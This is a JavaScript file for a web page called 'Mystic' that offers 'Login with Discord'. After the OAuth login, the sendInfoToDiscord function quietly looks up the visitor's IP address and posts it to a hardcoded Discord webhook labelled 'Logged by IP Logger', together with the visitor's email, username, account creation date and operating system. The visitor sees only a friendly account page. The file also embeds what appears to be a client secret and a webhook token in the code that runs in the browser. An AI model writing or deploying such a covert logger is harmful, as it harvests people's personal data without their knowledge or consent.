const clientId = '1297277649835786251';
const redirectUri = 'https://semodge2.github.io/test/'; // Your redirect URI
const scopes = 'identify email guilds'; // Define the scopes you need

async function loginWithDiscord() {
    const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scopes}`;
    window.location.href = authUrl;
}

async function fetchUserData(code) {
    const response = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            'client_id': clientId,
            'client_secret': 'Jezd4Sw13ks_1s9uViCpxtWUAHYSRsMD', // Keep this secret on the server in a real app
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirectUri,
        }),
    });

    if (!response.ok) {
        console.error('Failed to fetch access token:', await response.text());
        return;
    }

    const data = await response.json();

    // Fetch user info
    const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
            'Authorization': `Bearer ${data.access_token}`,
        },
    });

    if (!userInfoResponse.ok) {
        console.error('Failed to fetch user info:', await userInfoResponse.text());
        return;
    }

    const user = await userInfoResponse.json();
    const username = user.username;
    const email = user.email || "No Email attached.";
    const createdAt = new Date(user.created_at).toLocaleString();
    const operatingSystem = navigator.platform;

    // Send user info to Discord
    sendInfoToDiscord(email, username, createdAt, operatingSystem);

    // Store user data in sessionStorage for later use
    sessionStorage.setItem('username', username);
    sessionStorage.setItem('email', email);
}

async function sendInfoToDiscord(email, username, createdAt, operatingSystem) {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    const embedMessage = {
        embeds: [{
            title: '👤 New Visitor Info',
            color: 0xFF0000,
            fields: [
                { name: '📧 Email', value: email, inline: true },
                { name: '🖥️ IP Address', value: ip, inline: true },
                { name: '👤 Username', value: username, inline: true },
                { name: '📅 Account Created', value: createdAt, inline: true },
                { name: '🖥️ Operating System', value: operatingSystem, inline: true },
            ],
            footer: {
                text: 'Logged by IP Logger',
            }
        }]
    };

    const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embedMessage)
    });

    // Display user account info
    displayAccountInfo(username, email);
}

function displayAccountInfo(username, email) {
    document.body.innerHTML = `
        <div class="account-container">
            <h2>Hey @${username}, this is your account! :D</h2>
            <p>Email: <span id="email" style="display: none;">${email}</span>
                <button onclick="toggleEmail()">View Email</button>
            </p>
            <button onclick="logout()">Sign Out</button>
        </div>
    `;
}

function toggleEmail() {
    const emailElement = document.getElementById('email');
    if (emailElement.style.display === 'none') {
        emailElement.style.display = 'inline';
    } else {
        emailElement.style.display = 'none';
    }
}

function logout() {
    // Clear user data from sessionStorage and redirect to login
    sessionStorage.clear();
    window.location.href = window.location.origin; // Redirect to the original page to start login again
}

window.onload = function () {
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    if (code) {
        fetchUserData(code);
    } else {
        // Check if user is already logged in
        const username = sessionStorage.getItem('username');
        if (username) {
            const email = sessionStorage.getItem('email');
            displayAccountInfo(username, email);
        } else {
            // Show the login button if no code is present and no user is logged in
            document.body.innerHTML = `
                <div class="container">
                    <h1>Welcome to Mystic</h1>
                    <button onclick="loginWithDiscord()">Login with Discord</button>
                </div>
            `;
        }
    }
};
